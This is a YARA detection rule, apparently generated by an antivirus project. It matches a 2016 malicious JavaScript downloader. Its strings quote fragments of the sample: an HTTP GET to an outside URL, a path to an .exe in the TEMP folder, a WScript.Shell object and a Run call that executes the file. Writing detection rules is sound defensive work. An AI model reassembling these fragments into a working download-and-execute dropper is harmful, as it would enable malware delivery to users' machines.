rule sig_20160329_1f7296f4e5f713114d21a71f59df3368 {
  meta:
    description = "datamaliciousorder - file 20160329_1f7296f4e5f713114d21a71f59df3368.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f53e42889b41fb2d42f5ad2d532461b50a92d206e22768ab9a2eb142483cda86"

  strings:
    $s1  = "tw[K](\"GET\", \"http://www.aluguerdiadema.com/p9wsld\", false);" fullword ascii
    $s2  = "function np() {return M[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Rj67rewYjdO5la1K.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[S](p() * 11); if (tw[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var M = function kS() {return WScript[Sf](\"WScript.Shell\");}(), g = 11;" fullword ascii
    $s5  = "function jI(A0, s){XM = XM * 1; return A0 - s;};" fullword ascii
    $s6  = "function ax(){return \"\" + L;};" fullword ascii
    $s7  = "function AR(VX){M[\"Run\"](VX, XM, XM);};" fullword ascii
    $s8  = "function DR() {return ((o0 == true) && (o0 == b0)) ? 1 : XM;};" fullword ascii
    $s9  = "function O()" fullword ascii
    $s10 = "var o = new this[\"Date\"]();" fullword ascii
    $s11 = "return jI(K0, mt);" fullword ascii
    $s12 = " while (bw){" fullword ascii
    $s13 = "function ME(){return Sf;};" fullword ascii
    $s14 = "function b(rs) {var Z = (1, 2, 3, 4, 5, rs); return Z;};" fullword ascii
    $s15 = "function p(){return 22;};" fullword ascii
    $s16 = "o0 = true; " fullword ascii
    $s17 = "var o0 = false;" fullword ascii
    $s18 = "var b0 = false;" fullword ascii
    $s19 = "b0 = true; " fullword ascii
    $s20 = "} catch(I){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}